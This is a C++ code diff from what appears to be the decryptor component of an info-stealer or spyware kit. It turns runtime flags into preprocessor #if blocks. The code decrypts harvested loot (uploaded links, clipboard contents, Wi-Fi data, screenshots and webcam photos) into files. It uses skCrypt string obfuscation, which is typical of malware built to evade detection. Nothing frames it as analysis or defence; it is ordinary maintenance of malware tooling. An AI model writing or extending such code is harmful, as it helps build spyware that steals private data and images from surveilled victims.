@@ -112,77 +112,77 @@ int main(int argc, char* argv[]) {
 
 
     // links.txt
-    if (FILE_UPLOADER) {
-        string linksFileName = filePath + (string)skCrypt("\\links.txt");
-        ofstream linksFile(linksFileName, ios::out | ios::binary);
-        linksFile << smarker;
-        linksFile.close();
-        ofstream linksFile2(linksFileName, ios::out | ios::binary);
-        linksFile2 << aes_decrypt(KEY, content[contentIndex], IV);
-        linksFile2.close();
-        cout << skCrypt(" File decrypted in \"") << linksFileName << skCrypt("\"\n");
-    }
+#if FILE_UPLOADER
+    string linksFileName = filePath + (string)skCrypt("\\links.txt");
+    ofstream linksFile(linksFileName, ios::out | ios::binary);
+    linksFile << smarker;
+    linksFile.close();
+    ofstream linksFile2(linksFileName, ios::out | ios::binary);
+    linksFile2 << aes_decrypt(KEY, content[contentIndex], IV);
+    linksFile2.close();
+    cout << skCrypt(" File decrypted in \"") << linksFileName << skCrypt("\"\n");
+#endif
 
 
     // clipboard.txt
     contentIndex += 1;
-    if (GET_CLIPBOARD) {
-        string clipFileName = filePath + (string)skCrypt("\\clipboard.txt");
-        ofstream clipFile(clipFileName, ios::out | ios::binary);
-        clipFile << smarker;
-        clipFile.close();
-        ofstream clipFile2(clipFileName, ios::out | ios::binary);
-        clipFile2 << aes_decrypt(KEY, content[contentIndex], IV);
-        clipFile2.close();
-        cout << skCrypt(" File decrypted in \"") << clipFileName << skCrypt("\"\n");
-    }
+#if GET_CLIPBOARD
+    string clipFileName = filePath + (string)skCrypt("\\clipboard.txt");
+    ofstream clipFile(clipFileName, ios::out | ios::binary);
+    clipFile << smarker;
+    clipFile.close();
+    ofstream clipFile2(clipFileName, ios::out | ios::binary);
+    clipFile2 << aes_decrypt(KEY, content[contentIndex], IV);
+    clipFile2.close();
+    cout << skCrypt(" File decrypted in \"") << clipFileName << skCrypt("\"\n");
+#endif
 
 
     // wifi.txt
     contentIndex += 1;
-    if (GET_WIFI) {
-        string wifiFileName = filePath + (string)skCrypt("\\wifi.txt");
-        ofstream wifiFile(wifiFileName, ios::out | ios::binary);
-        wifiFile << smarker;
-        wifiFile.close();
-        ofstream wifiFile2(wifiFileName, ios::out | ios::binary);
-        wifiFile2 << aes_decrypt(KEY, content[contentIndex], IV);
-        wifiFile2.close();
-        cout << skCrypt(" File decrypted in \"") << wifiFileName << skCrypt("\"\n");
-    }
+#if GET_WIFI
+    string wifiFileName = filePath + (string)skCrypt("\\wifi.txt");
+    ofstream wifiFile(wifiFileName, ios::out | ios::binary);
+    wifiFile << smarker;
+    wifiFile.close();
+    ofstream wifiFile2(wifiFileName, ios::out | ios::binary);
+    wifiFile2 << aes_decrypt(KEY, content[contentIndex], IV);
+    wifiFile2.close();
+    cout << skCrypt(" File decrypted in \"") << wifiFileName << skCrypt("\"\n");
+#endif
 
 
     // screenshot.bmp
     contentIndex += 1;
-    if (GET_SCREENSHOT) {
-        string screenFileName = filePath + (string)skCrypt("\\screenshot.bmp");
-        ofstream screenFile(screenFileName, ios::out | ios::binary);
-        vector<BYTE> screenshot = base64_decode(aes_decrypt(KEY, content[contentIndex], IV));
-        screenFile.write((const char*)&screenshot[0], screenshot.size());
-        screenFile.close();
-        cout << skCrypt(" File decrypted in \"") << screenFileName << skCrypt("\"\n");
-    }
+#if GET_SCREENSHOT
+    string screenFileName = filePath + (string)skCrypt("\\screenshot.bmp");
+    ofstream screenFile(screenFileName, ios::out | ios::binary);
+    vector<BYTE> screenshot = base64_decode(aes_decrypt(KEY, content[contentIndex], IV));
+    screenFile.write((const char*)&screenshot[0], screenshot.size());
+    screenFile.close();
+    cout << skCrypt(" File decrypted in \"") << screenFileName << skCrypt("\"\n");
+#endif
 
 
     // photos
     contentIndex += 1;
-    if (TAKE_WEBCAMS) {
-        for (string file : Split(aes_decrypt(KEY, content[contentIndex], IV), '\n')) {
-            vector<string> splitted = Split(file, ' ');
-            if (splitted.size() < 1)
-                break;
-            string fileName = splitted[0];
-            string fileData = splitted[1];
-            if (base64_decode(fileData).size() <= 10)
-                break;
-            string webcamFileName = filePath + (string)skCrypt("\\webcam-") + fileName;
-            ofstream webcamFile(webcamFileName, ios::out | ios::binary);
-            vector<BYTE> webcam = base64_decode(fileData);
-            webcamFile.write((const char*)&webcam[0], webcam.size());
-            webcamFile.close();
-            cout << skCrypt(" File decrypted in \"") << webcamFileName << skCrypt("\"\n");
-        }
+#if TAKE_WEBCAMS
+    for (string file : Split(aes_decrypt(KEY, content[contentIndex], IV), '\n')) {
+        vector<string> splitted = Split(file, ' ');
+        if (splitted.size() < 1)
+            break;
+        string fileName = splitted[0];
+        string fileData = splitted[1];
+        if (base64_decode(fileData).size() <= 10)
+            break;
+        string webcamFileName = filePath + (string)skCrypt("\\webcam-") + fileName;
+        ofstream webcamFile(webcamFileName, ios::out | ios::binary);
+        vector<BYTE> webcam = base64_decode(fileData);
+        webcamFile.write((const char*)&webcam[0], webcam.size());
+        webcamFile.close();
+        cout << skCrypt(" File decrypted in \"") << webcamFileName << skCrypt("\"\n");
     }
+#endif
     
 
     cout << skCrypt("\n ");
